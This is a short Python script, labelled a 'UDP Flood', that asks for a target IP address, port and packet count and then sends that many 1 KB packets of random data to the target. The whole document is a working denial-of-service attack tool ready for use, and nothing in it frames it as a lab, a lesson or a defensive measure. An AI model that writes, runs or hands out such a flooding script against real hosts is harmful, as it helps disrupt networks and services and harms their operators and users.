
import socket
import random

# Get the IP and port from the user
ip_target = input("Enter the target IP: ")
port_target = int(input("Enter the target port (between 1 and 65535): "))

# Create a socket for sending packets
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

try:
    # Set the packet size to 1 KB
    packet_size = 1024

    # Loop until the user decides to stop or input number of packets is not valid
    while True:
        try:
            # Ask the user how many packets to send
            num_packets = int(input("How many 1KB packets to send (greater than 0): "))

            if num_packets > 0:
                break

            else:
                print("Number of packets must be greater than zero. Try again.")

        except ValueError:
            print("Invalid input. Please enter a valid integer.")
    
    # Loop until all the packets are sent
    for i in range(num_packets):
        try:
            # Generate random bytes for payload
            data = bytearray(random.getrandbits(8) & 0xFF for _ in range(packet_size))

            # Send packet to target IP and port
            s.sendto(data, (ip_target, port_target))
        
        except KeyboardInterrupt:
            print("\nUDP Flood interrupted, Program closing")
            break
    
    print("UDP Flood success")

except ConnectionRefusedError:
    print(f"Port {port_target} on {ip_target} is not open.")

except socket.gaierror as e:
    print(f"Invalid IP address: {e}")

finally:
    # Close the socket
    s.close()
    print("\nProgram closed.")